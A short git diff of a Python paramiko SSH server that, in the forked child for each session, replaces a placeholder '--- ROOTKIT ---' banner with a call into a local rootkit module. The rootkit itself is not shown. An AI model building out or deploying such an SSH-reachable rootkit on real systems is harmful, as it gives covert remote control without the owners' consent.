@@ -10,7 +10,8 @@ import pty
 import select
 import os
 import paramiko
-from src.ssh import SshServerInterface
+from .ssh import SshServerInterface
+from .rootkit import main as rootkit_main
 
 
 class SshServer:
@@ -83,11 +84,7 @@ class SshServer:
 
             pid, fd = pty.fork()
             if pid == 0:
-                print("\033[1;32m--- ROOTKIT ---\033[0m")
-                print("\033[1;31mHello")
-                print("\033[1;0m", end="")
-                penis = input("$ ")
-                print("Your input:", penis)
+                rootkit_main.main()
                 session.close()
                 sys.exit()
 
